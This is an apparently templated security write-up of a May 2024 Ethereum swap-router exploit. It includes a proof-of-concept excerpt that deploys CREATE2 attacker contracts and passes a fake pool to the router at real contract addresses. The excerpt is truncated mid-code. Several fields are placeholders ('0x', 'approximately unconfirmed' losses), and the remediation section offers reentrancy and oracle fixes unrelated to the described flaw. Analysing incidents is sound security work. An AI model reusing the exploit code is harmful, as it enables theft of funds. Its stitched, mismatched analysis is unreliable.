# Mixed Swap Router — Input Validation Failure in Swap Router Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-19 |
| **Protocol** | Mixed Swap Router |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://etherscan.io/address/0x) |
| **Attack Tx** | [0x](https://etherscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://etherscan.io/address/0x) |
| **Root Cause** | Input validation failure in swap router |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/MixedSwapRouter_exp.sol) |

---
## 1. Vulnerability Overview

Mixed Swap Router is a DeFi protocol operating on the Ethereum chain that suffered a **router vulnerability** attack on 2024-05-19.
The attacker exploited input validation failure in the swap router, causing approximately **unconfirmed** in losses.

### Key Vulnerability Summary
- **Classification**: Router vulnerability
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Logic vulnerability

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Input validation failure in swap router
// The attacker exploits this logic to gain illegitimate profit

// MixedSwapRouter interface — vulnerable function with insufficient router input validation
interface MixedSwapRouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMin;  // ❌ Vulnerable: unlimited slippage when set to 0
        address[] pool;        // ❌ Vulnerable: arbitrary pool address can be specified without validation
    }

    // ❌ Vulnerable: pool array addresses are not validated, allowing malicious pool contract injection
    // algebraSwapCallback can be abused to drain router balance
    function swapTokensForTokens(ExactInputParams memory params) external;

    // ❌ Vulnerable: no verification that algebraSwapCallback is called only from authorized pools
    function algebraSwapCallback(int256 amount0, int256 amount1, bytes calldata data) external;
}

// ✅ Correct implementation: pool address whitelist + callback sender verification
function safeSwapTokensForTokens(MixedSwapRouter.ExactInputParams memory params) external {
    // ✅ Verify each pool address is on the allowlist
    for (uint256 i = 0; i < params.pool.length; i++) {
        require(approvedPools[params.pool[i]], "Router: pool not approved");
    }
    // ✅ Verify amountOutMin is not 0 (slippage protection)
    require(params.amountOutMin > 0, "Router: amountOutMin must be > 0");
    // ✅ Verify deadline
    require(params.deadline >= block.timestamp, "Router: expired deadline");
    _executeSwap(params);
}

function safeAlgebraSwapCallback(int256 amount0, int256 amount1, bytes calldata data) external {
    // ✅ Must verify that the callback sender is an authorized Algebra pool
    require(approvedPools[msg.sender], "Callback: not approved pool");
    _handleCallback(amount0, amount1, data);
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Identify Vulnerability] ─────── Mixed Swap Router Contract
  │
  ▼
[Send Malicious Transaction] ─── Call Vulnerable Function
  │                                (Bypass Validation)
  ▼
[Drain Assets] ──────────────── Secure Profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - MixedSwapRouter_exp.sol
// Chain: Ethereum | Date: 2024-05-19

    function testExploit() external {
        attack();
    }

    function attack() internal {
        address one = create_contract(1);
    }

    function cal_address(
        uint256 time
    ) internal returns (address) {
        bytes memory bytecode = type(Exploit).creationCode;
        uint256 _salt = time;
        bytecode = abi.encodePacked(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        address hack_contract = address(uint160(uint256(hash)));
        return hack_contract;
    }

    function create_contract(
        uint256 times
    ) internal returns (address) {
        uint256 i = 0;
        while (i < times) {
            bytes memory bytecode = type(Exploit).creationCode;
            uint256 _salt = i;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract = address(uint160(uint256(hash)));
            address addr;
            // Use create2 to send money first.
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            i++;
            return hack_contract;
        }
    }

    receive() external payable {}
}

contract Exploit is Test {
    IERC20 WINR = IERC20(0xD77B108d4f6cefaa0Cae9506A934e825BEccA46E);
    address owner;
    MixedSwapRouter Swaprouter = MixedSwapRouter(0xE3E98241CB99AF7a452e94B9cf219aAa766e0869);

    constructor() {
        owner = msg.sender;
        attacks();
    }

    function attacks() internal {
        address two = create_contract(2);
        address[] memory pools = new address[](1);
        pools[0] = address(two);
        MixedSwapRouter.ExactInputParams memory pgs = MixedSwapRouter.ExactInputParams({
            path: hex"d77b108d4f6cefaa0cae9506a934e825becca46e000000d77b108d4f6cefaa0cae9506a934e825becca46e",
            recipient: address(this),
            deadline: block.timestamp + 1000,
```

> **Note**: The above code is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criteria | Details |
|-----------|------|
| **DASP Top 10** | Logic vulnerability |
| **Attack Type** | Smart contract bug |
| **Vulnerability Category** | DeFi attack |
| **Attack Complexity** | Medium |
| **Prerequisites** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code modification) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Suspend vulnerable function**: Apply emergency pause to the affected function
2. **Assess damage**: Identify scale of lost assets and classify affected users
3. **Notify relevant parties**: Immediately inform related DEXs, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (using OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-term Improvements
- Conduct **independent security audits** (at least 2 audit firms)
- Operate a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency pause mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Router vulnerability attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: Every function must be designed with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Establish systems to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain an actionable response manual ready for immediate execution upon attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the DeFi Ecosystem at Large
- The **2024-05-19** Mixed Swap Router incident reconfirmed the danger of **router vulnerability** attacks in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was created for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/MixedSwapRouter_exp.sol)*